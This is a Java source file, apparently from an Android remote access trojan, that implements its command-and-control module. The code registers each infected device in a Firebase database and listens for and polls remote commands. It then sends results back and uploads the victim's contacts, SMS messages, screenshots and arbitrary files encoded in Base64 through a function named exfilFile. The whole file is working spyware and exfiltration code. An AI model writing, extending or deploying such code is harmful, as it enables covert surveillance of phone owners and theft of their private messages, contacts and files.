package com.ratio.ratapp;

import android.content.Context;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;

import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class C2Manager {

    private static final String TAG = "C2M";
    private static String deviceId;

    private static DatabaseReference db() {
        return FirebaseDatabase.getInstance().getReference();
    }

    public static String getDeviceId(Context ctx) {
        if (deviceId == null) {
            deviceId = Settings.Secure.getString(
                ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            if (deviceId == null || deviceId.isEmpty()) deviceId = "unknown";
        }
        return deviceId;
    }

    public static DatabaseReference agentRoot(Context ctx) {
        return db().child("agents").child(getDeviceId(ctx));
    }

    public static void syncDeviceProfile(Context ctx) {
        Map<String, Object> profile = DeviceInfo.snapshot(ctx);
        profile.put("lastSeen", System.currentTimeMillis());
        profile.put("online", true);
        agentRoot(ctx).child("profile").updateChildren(profile, (e, r) ->
            Log.e(TAG, "profile err: " + e));
    }

    public static void heartbeat(Context ctx) {
        Map<String, Object> h = new HashMap<>();
        h.put("lastSeen", System.currentTimeMillis());
        h.put("online", true);
        agentRoot(ctx).child("profile").updateChildren(h);
    }

    public interface CommandCallback {
        void onCommand(DataSnapshot snap);
    }

    public static void listenCommands(Context ctx, final CommandCallback cb) {
        agentRoot(ctx).child("commands")
            .addChildEventListener(new ChildEventListener() {
                @Override
                public void onChildAdded(DataSnapshot snap, String prev) {
                    cb.onCommand(snap);
                }
                @Override public void onChildChanged(DataSnapshot s, String p) {}
                @Override public void onChildRemoved(DataSnapshot s) {}
                @Override public void onChildMoved(DataSnapshot s, String p) {}
                @Override public void onCancelled(DatabaseError e) {
                    Log.e(TAG, "cmd listener: " + e.getMessage());
                }
            });
    }

    // fallback poll: fetch last five commands, skip any we've already run
    public static void pollCommands(Context ctx, CommandCallback cb) {
        agentRoot(ctx).child("meta").child("lastCmdKey").get()
            .addOnCompleteListener(task -> {
                String lastKey = task.isSuccessful()
                    ? task.getResult().getValue(String.class) : null;
                agentRoot(ctx).child("commands").orderByKey().limitToLast(5).get()
                    .addOnCompleteListener(t2 -> {
                        if (!t2.isSuccessful() || t2.getResult() == null) return;
                        for (DataSnapshot s : t2.getResult().getChildren()) {
                            if (lastKey != null && lastKey.compareTo(s.getKey()) >= 0) continue;
                            cb.onCommand(s);
                            agentRoot(ctx).child("meta").child("lastCmdKey").setValue(s.getKey());
                        }
                    });
            });
    }

    public static void pushResult(Context ctx, String cmdKey, Map<String, Object> result) {
        Map<String, Object> payload = new HashMap<>(result);
        payload.put("ts", System.currentTimeMillis());
        agentRoot(ctx).child("results").child(cmdKey).setValue(payload);
        db().child("results").child(getDeviceId(ctx)).child(cmdKey).setValue(payload);
    }

    public static void pushContacts(Context ctx) {
        agentRoot(ctx).child("data").child("contacts").setValue(ContactsReader.read(ctx));
    }

    public static void pushSms(Context ctx) {
        agentRoot(ctx).child("data").child("sms").setValue(SmsReader.read(ctx));
    }

    // screenshot result parked under its own key so panel can poll
    public static void pushScreenshot(Context ctx, Map<String, Object> payload) {
        burstLocationsIfAny(ctx);
        agentRoot(ctx).child("results")
            .child("screenshot_" + System.currentTimeMillis())
            .setValue(payload);
    }

    private static void burstLocationsIfAny(Context ctx) {
        // noop — reserved for future lanes
    }

    public static void exfilFile(Context ctx, String path) {
        File f = new File(path);
        Map<String, Object> body = new HashMap<>();
        body.put("name", f.getName());
        body.put("size", f.length());

        // gate: RTDB node writes cap out past ~1MB
        if (f.length() > 900 * 1024) {
            body.put("error", "file too large for rtdb (" + f.length() + " bytes)");
        } else {
            try {
                byte[] buf = new byte[(int) f.length()];
                FileInputStream in = new FileInputStream(f);
                int total = 0;
                while (total < buf.length) {
                    int r = in.read(buf, total, buf.length - total);
                    if (r < 0) break;
                    total += r;
                }
                in.close();
                if (total != buf.length) throw new IOException("short read: " + total);
                body.put("body", Base64.encodeToString(buf, Base64.NO_WRAP));
            } catch (Exception e) {
                body.put("error", e.getMessage());
            }
        }
        agentRoot(ctx).child("data").child("files").child(System.currentTimeMillis() + "_" + f.getName())
            .setValue(body);
    }
}
